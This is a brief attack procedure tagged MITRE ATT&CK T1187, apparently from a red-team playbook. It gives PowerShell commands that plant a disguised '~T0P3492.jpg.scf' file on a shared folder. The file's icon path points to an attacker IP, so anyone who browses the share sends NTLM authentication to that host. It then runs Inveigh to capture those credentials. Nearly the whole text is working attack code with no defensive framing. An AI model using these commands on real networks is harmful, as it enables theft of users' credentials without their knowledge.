# Creat scf File

MITRE ATT&CK Technique: [T1187](https://attack.mitre.org/wiki/Technique/T1187)

  $IPAddress = “192.168.1.1” # unc server
  $Location = “\\FILESERVER\FilesShare” # file server
  "[Shell]" > $Location\~T0P3492.jpg.scf
  "Command=2" >> $Location\~T0P3492.jpg.scf;
  "IconFile=\\$IPAddress\remote.ico" >> $Location\~T0P3492.jpg.scf
  "[Taskbar]" >> $Location\~T0P3492.jpg.scf
  "Command=ToggleDesktop" >> $Location\~T0P3492.jpg.scf

## Run Inveigh to Receive the Authentication Attempts

PS> Invoke-Inveigh -FileOutputDirectory C:\Temp\ -FileOutput Y -HTTP Y -NBNS Y -Tool 1
https://github.com/Kevin-Robertson/Inveigh
